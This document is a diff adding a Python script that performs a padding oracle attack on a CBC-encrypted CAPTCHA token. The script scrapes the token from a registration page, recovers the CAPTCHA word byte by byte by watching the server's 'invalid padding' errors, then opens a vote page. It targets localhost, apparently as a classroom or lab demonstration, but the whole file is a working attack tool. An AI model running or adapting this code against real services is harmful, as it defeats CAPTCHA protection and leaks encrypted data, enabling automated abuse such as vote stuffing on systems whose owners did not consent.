@@ -1,0 +1,170 @@
+#!/usr/bin/env python
+import base64, sys, io, time, webbrowser, urllib
+import requests
+from bs4 import BeautifulSoup
+from PIL import Image
+import cv2
+import numpy as np
+
+SB_LENGTH = 16
+DEFAULT_PADDING_CHAR = "+"
+
+def print_colored( cipher, idx ):
+    print " ".join([
+            red(cipher[:idx*2]), # c' block which we haven't touched yet
+            blue(cipher[idx*2:idx*2+2]), # current bytes being modified
+            green(cipher[idx*2+2:])]) # bytes we already found
+
+def blue( s ):
+    return "\033[00;34m{}\033[00m".format(s)
+
+def green( s ):
+    return "\033[01;32m{}\033[00m".format(s)
+
+def red( s ):
+    return "\033[01;31m{}\033[00m".format(s)
+
+'''
+    Take in base64 string and return PIL image
+'''
+def stringToImage( base64_string ):
+    return Image.open(io.BytesIO(base64.b64decode(base64_string)))
+
+'''
+    Convert PIL Image to an RGB image( technically a numpy array ) that's compatible with opencv
+'''
+def toRGB( image ):
+    return cv2.cvtColor(np.array(image), cv2.COLOR_BGR2RGB)
+
+'''
+    Split cipher into blocks of specified length
+'''
+def split_len( cipher, length=SB_LENGTH ):
+    return [cipher[i:i+length] for i in range(0, len(cipher), length)]
+
+'''
+    Get html response from oracle link
+'''
+def ask_oracle( url ):
+    r = requests.get(url)
+    if r.status_code != 200:
+        raise ValueError("Invalid response from url : [{}] \n{}".format(
+            str(r.status_code),
+            r.text))
+    return r.text
+
+'''
+    Check if our ciphertext is valid by send it at to specifiec url
+    And checking the returned value doesn't contain the words specified
+    in verification
+'''
+def is_valid_cipher( cipher, oracle, verification ):
+    return verification not in ask_oracle( oracle + urllib.quote( base64.b64encode(cipher) ) )
+
+'''
+    Convert plain list of ints to chars
+    And convert pad to '+' or specified char
+'''
+def compute_word( plain, padding=DEFAULT_PADDING_CHAR ):
+    return "".join([chr(c) if (c > 0x08) else padding for c in plain])
+
+'''
+    Run padding oracle attack
+'''
+def attack( cipher, oracle, verification, block_length=SB_LENGTH ):
+    cipher_block = split_len( cipher, length=block_length )
+
+    # At least 2 blocks required to be able to decypher msg
+    if len(cipher_block) == 1:
+        print ">> At least 2 cypher blocks required"
+        exit()
+
+    results = []
+
+    for i in range(0, len(cipher_block)):
+        if i + 1 == len(cipher_block):
+            break
+        a = len(cipher_block) - 1
+        prevblock = cipher_block[a-i-1]
+        block = cipher_block[a-i]
+
+        ivals = []
+        plain = []
+        cprime = chr(0)*SB_LENGTH
+
+        for cprime_idx in range( SB_LENGTH - 1, -1, -1 ):
+            # Create a PKCS#7 padding index [0x01, 0x08]
+            padding_idx = SB_LENGTH - cprime_idx
+
+            for guess in range(256):
+                # Create new ciphertext with the guess
+                if cprime_idx > 0:
+                    ciphertext = cprime[:cprime_idx]
+                    ciphertext += chr(guess)
+                else:
+                    ciphertext = chr(guess)
+
+                # Insert the previous intermediate values
+                for intr in ivals:
+                    # Adjust them for this padding index
+                    ciphertext += chr(intr^padding_idx)
+
+                # Append the block we're cracking
+                ciphertext += block
+
+                sys.stdout.write("\033[F") # Cursor up one line
+                print_colored(ciphertext.encode("hex"), cprime_idx)
+
+                # If the oracle correctly decrypts the ciphertext
+                if is_valid_cipher( ciphertext, oracle, verification ):
+                    # Calculate the intermediate value
+                    intermediate = guess^padding_idx
+                    # Save the intermediate value
+                    ivals.insert(0, intermediate)
+                    # Crack the plain text character
+                    plain.insert(0, intermediate^ord(prevblock[cprime_idx]))
+
+                    # We found it, bail out
+                    if cprime_idx:
+                        print
+
+                    break
+
+        print "  " + green(ciphertext.encode("hex")) # print final decoded cipher
+
+        print "\nIntermediate values = {}\n".format(ivals)
+
+        plainstr = compute_word(plain)
+        results.append(plainstr)
+
+    return results
+
+def main():
+    result = requests.get("http://localhost:8888/register-get.php")
+    soup = BeautifulSoup(result.content, 'lxml')
+    input = soup.find(id="captcha-verification")
+    b64img = soup.find(id="captcha-img")
+
+    # DEBUG: Opens an image with the captcha it's trying to crack
+    cvimg = stringToImage(b64img['src'].split("base64,")[1])
+    cv2.imshow('Image', toRGB(cvimg))
+    cv2.waitKey(0)
+
+    cipher = base64.b64decode(input['value'])
+    oracle = "http://localhost:8888/verify-captcha.php?captcha-verification="
+    verification = "invalid padding"
+
+    print
+    word = attack( cipher, oracle, verification )
+
+    print "Captcha word is : {} ('+' represents padding)".format("".join(reversed(word)))
+
+    print green("[Done]")
+
+    # DEBUG: Opens a webbrowser tab with the votepage to simulate login
+    cv2.waitKey(0)
+    webbrowser.open('http://localhost:8888/vote.html')
+    time.sleep(10000) # wait so the picture window stays open and we can explain
+
+if __name__ == '__main__':
+    main()
